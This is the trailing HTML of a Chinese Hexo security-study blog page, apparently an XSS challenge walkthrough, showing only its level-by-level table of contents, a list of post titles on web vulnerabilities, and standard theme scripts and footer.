class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E5%85%B3"><span class="toc-number">2.3.</span> <span class="toc-text">第三关</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BA%90%E7%A0%81-1"><span class="toc-number">2.3.1.</span> <span class="toc-text">源码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86"><span class="toc-number">2.3.2.</span> <span class="toc-text">知识</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%95%E8%BF%87-1"><span class="toc-number">2.3.3.</span> <span class="toc-text">绕过</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E5%85%B3"><span class="toc-number">2.4.</span> <span class="toc-text">第四关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E5%85%B3"><span class="toc-number">2.5.</span> <span class="toc-text">第五关</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%95%E8%BF%87-2"><span class="toc-number">2.5.1.</span> <span class="toc-text">绕过</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E5%85%AD%E5%85%B3"><span class="toc-number">2.6.</span> <span class="toc-text">第六关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%83%E5%85%B3"><span class="toc-number">2.7.</span> <span class="toc-text">第七关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E5%85%AB%E5%85%B3"><span class="toc-number">2.8.</span> <span class="toc-text">第八关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B9%9D%E5%85%B3"><span class="toc-number">2.9.</span> <span class="toc-text">第九关</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E5%85%B3"><span class="toc-number">3.</span> <span class="toc-text">第十关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E4%B8%80%E5%85%B3"><span class="toc-number">4.</span> <span class="toc-text">第十一关</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86-1"><span class="toc-number">4.0.1.</span> <span class="toc-text">知识</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%95%E8%BF%87-3"><span class="toc-number">4.0.2.</span> <span class="toc-text">绕过</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%85%B3"><span class="toc-number">4.1.</span> <span class="toc-text">第十二关</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E4%B8%89%E5%85%B3"><span class="toc-number">5.</span> <span class="toc-text">第十三关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E5%9B%9B%E5%85%B3"><span class="toc-number">6.</span> <span class="toc-text">第十四关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E4%BA%94%E5%85%B3"><span class="toc-number">7.</span> <span class="toc-text">第十五关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E5%85%AD%E5%85%B3"><span class="toc-number">8.</span> <span class="toc-text">第十六关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E4%B8%83%E5%85%B3"><span class="toc-number">9.</span> <span class="toc-text">第十七关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E5%85%AB%E5%85%B3"><span class="toc-number">10.</span> <span class="toc-text">第十八关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E4%B9%9D%E5%85%B3"><span class="toc-number">11.</span> <span class="toc-text">第十九关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%B3"><span class="toc-number">12.</span> <span class="toc-text">第二十关</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-4 i,
+        .toc-level-4 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2021/09/21/28WEB%E6%BC%8F%E6%B4%9E-XSS%E8%B7%A8%E7%AB%99%E4%B9%8BWAF%E7%BB%95%E8%BF%87%E5%8F%8A%E5%AE%89%E5%85%A8%E4%BF%AE%E5%A4%8D/" title="上一篇: 28WEB漏洞-XSS跨站之WAF绕过及安全修复">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2021/09/21/26WEB%E6%BC%8F%E6%B4%9E-XSS%E8%B7%A8%E7%AB%99%E4%B9%8B%E8%AE%A2%E5%8D%95%E5%8F%8AShell%E7%AE%B1%E5%AD%90%E5%8F%8D%E6%9D%80%E8%AE%B0/" title="下一篇: 26WEB漏洞-XSS跨站之订单及Shell箱子反杀记">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/37WEB%E6%BC%8F%E6%B4%9E-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP/">37WEB漏洞-反序列化之PHP</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/36WEB%E6%BC%8F%E6%B4%9E-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81%E4%B8%8EToken%E5%8F%8A%E6%8E%A5%E5%8F%A3/">36WEB漏洞-逻辑越权之验证码与Token及接口</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/35WEB%E6%BC%8F%E6%B4%9E-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6%E5%8F%8A%E6%8E%A5%E5%8F%A3%E7%88%86%E7%A0%B4/">35WEB漏洞-逻辑越权之找回机制及接口爆破</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/34WEB%E6%BC%8F%E6%B4%9E-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%94%AF%E4%BB%98%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9%E5%AE%89%E5%85%A8/">34WEB漏洞-逻辑越权之支付数据篡改安全</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/33WEB%E6%BC%8F%E6%B4%9E-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%E5%85%A8%E8%A7%A3/">33WEB漏洞-逻辑越权之水平垂直越权全解</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/32WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/">32WEB漏洞-文件操作之文件下载读取全解</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/31WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/">31WEB漏洞-文件操作之文件包含漏洞全解</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/30WEB%E6%BC%8F%E6%B4%9E-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/">30WEB漏洞-RCE代码及命令执行漏洞全解</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/29WEB%E6%BC%8F%E6%B4%9E-CSRF%E5%8F%8ASSRF%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E8%AE%B2%E8%A7%A3/">29WEB漏洞-CSRF及SSRF漏洞案例讲解</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/28WEB%E6%BC%8F%E6%B4%9E-XSS%E8%B7%A8%E7%AB%99%E4%B9%8BWAF%E7%BB%95%E8%BF%87%E5%8F%8A%E5%AE%89%E5%85%A8%E4%BF%AE%E5%A4%8D/">28WEB漏洞-XSS跨站之WAF绕过及安全修复</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/27WEB%E6%BC%8F%E6%B4%9E-XSS%E8%B7%A8%E7%AB%99%E4%B9%8B%E4%BB%A3%E7%A0%81%E5%8F%8Ahttponly%E7%BB%95%E8%BF%87/">27WEB漏洞-XSS跨站之代码及httponly绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/26WEB%E6%BC%8F%E6%B4%9E-XSS%E8%B7%A8%E7%AB%99%E4%B9%8B%E8%AE%A2%E5%8D%95%E5%8F%8AShell%E7%AE%B1%E5%AD%90%E5%8F%8D%E6%9D%80%E8%AE%B0/">26WEB漏洞-XSS跨站之订单及Shell箱子反杀记</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/25WEB%E6%BC%8F%E6%B4%9E-XSS%E8%B7%A8%E7%AB%99%E4%B9%8B%E5%8E%9F%E7%90%86%E5%88%86%E7%B1%BB%E5%8F%8A%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/">25WEB漏洞-XSS跨站之原理分类及攻击手法</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/24WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8BWAF%E7%BB%95%E8%BF%87%E5%8F%8A%E5%AE%89%E5%85%A8%E4%BF%AE%E5%A4%8D/">24WEB漏洞-文件上传之WAF绕过及安全修复</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/23WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E7%BC%96%E8%BE%91%E5%99%A8%E5%AE%89%E5%85%A8/">23WEB漏洞-文件上传之解析漏洞编辑器安全</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/22WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E5%86%85%E5%AE%B9%E9%80%BB%E8%BE%91%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87/">22WEB漏洞-文件上传之内容逻辑数组绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/21WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E5%90%8E%E7%AB%AF%E9%BB%91%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/">21WEB漏洞--文件上传之后端黑白名单绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/20WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E5%9F%BA%E7%A1%80%E5%8F%8A%E8%BF%87%E6%BB%A4%E6%96%B9%E5%BC%8F/">20WEB漏洞--文件上传之基础及过滤方式</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/19WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%B7%B1%E5%85%A5WAF%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/">19WEB漏洞--SQL注入之深入WAF注入绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/18WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%A0%86%E5%8F%A0%E5%8F%8AWAF%E7%BB%95%E8%BF%87%E6%B3%A8%E5%85%A5/">18WEB漏洞--SQL注入之堆叠及WAF绕过注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/17WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E4%BA%8C%E6%AC%A1%E3%80%81%E5%8A%A0%E8%A7%A3%E5%AF%86%E3%80%81DNS%E7%AD%89%E6%B3%A8%E5%85%A5/">17WEB漏洞--SQL注入之二次、加解密、DNS等注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/16WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F%E5%8F%8A%E6%8A%A5%E9%94%99%E7%9B%B2%E6%B3%A8/">16WEB漏洞--SQL注入之查询方式及报错盲注</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/15WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOracle%E3%80%81MongoDB%E6%B3%A8%E5%85%A5/">15WEB漏洞--SQL注入之Oracle、MongoDB注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/14WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%85%A5/">14WEB漏洞--SQL注入之类型及提交注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/13WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BMYSQL%E6%B3%A8%E5%85%A5/">13WEB漏洞--SQL注入之MYSQL注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/12WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%AE%80%E8%A6%81SQL%E6%B3%A8%E5%85%A5/">12WEB漏洞--SQL注入之简要SQL注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/11WEB%E6%BC%8F%E6%B4%9E-%E5%BF%85%E6%87%82%E7%9F%A5%E8%AF%86/">11WEB漏洞--必懂知识</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/10%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E8%B5%84%E4%BA%A7%E7%9B%91%E6%8E%A7%E6%8B%93%E5%B1%95/">10信息收集-资产监控拓展</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/09%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-APP%E5%8F%8A%E5%85%B6%E4%BB%96%E8%B5%84%E4%BA%A7%E7%AD%89/">09信息收集--APP及其他资产等</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/08%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%9E%B6%E6%9E%84%EF%BC%8C%E6%90%AD%E5%BB%BA%EF%BC%8CWAF/">08信息收集--架构，搭建，WAF</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/07%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-CDN%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF/">07信息收集--CDN绕过技术</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/06%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/">06基础入门--加密编码算法</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/05%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E7%B3%BB%E7%BB%9F%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%BA%93/">05基础入门--系统及数据库</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/04%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-WEB%E6%BA%90%E7%A0%81%E6%8B%93%E5%B1%95/">04基础入门--WEB源码拓展</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/03%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%90%AD%E5%BB%BA%E5%AE%89%E5%85%A8%E6%8B%93%E5%B1%95/">03基础入门--搭建安全拓展</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/12/02%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%95%B0%E6%8D%AE%E5%8C%85%E6%8B%93%E5%B1%95/">02基础入门--数据包拓展</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/10/01%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%A6%82%E5%BF%B5%E5%90%8D%E8%AF%8D/">01基础入门--概念名词</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2021 Al0nez
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 6;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        $("a[target=_blank]").removeAttr("target");
+    
+</script>
+
+    <script>
+        var originTitle = document.title;
+        var titleTime;
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "(つェ⊂) 我藏好了哦~ " + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
